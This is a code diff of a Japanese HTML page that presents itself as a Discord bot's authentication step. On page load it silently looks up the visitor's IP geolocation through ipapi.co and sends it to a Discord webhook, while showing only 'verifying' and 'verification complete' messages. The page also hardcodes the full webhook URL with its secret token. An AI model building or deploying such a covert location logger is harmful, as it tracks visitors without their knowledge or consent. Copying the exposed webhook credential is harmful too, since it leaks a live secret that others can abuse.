@@ -3,28 +3,20 @@
 <head><meta charset="UTF-8"><title>認証処理</title></head>
 <body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
     <h1 id="status">認証中...</h1>
-    <p id="msg"></p>
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
-
         async function start() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const state = urlParams.get('state');
-
+            const params = new URLSearchParams(window.location.search);
+            const state = params.get('state');
             if (!state) {
-                document.getElementById('status').innerText = "❌ パラメータ不足";
-                document.getElementById('msg').innerText = "stateパラメータがありません。Botから発行された最新のリンクを使用してください。";
+                document.getElementById('status').innerText = "❌ パラメータ不足。最新のリンクを使用してください。";
                 return;
             }
-
             try {
-                // LID_xxx_UID_xxx_RID_xxx を分解
                 const logId = state.split('LID_')[1].split('_UID_')[0];
                 const userId = state.split('_UID_')[1].split('_RID_')[0];
-
                 const res = await fetch('https://ipapi.co/json/');
                 const geo = await res.json();
-
                 await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
@@ -37,9 +29,9 @@
                         }]
                     })
                 });
-                document.getElementById('status').innerText = "✅ 認証完了";
+                document.getElementById('status').innerText = "✅ 認証完了。ページを閉じてください。";
             } catch (e) {
-                document.getElementById('status').innerText = "❌ 送信エラー";
+                document.getElementById('status').innerText = "❌ 通信エラー。";
             }
         }
         start();
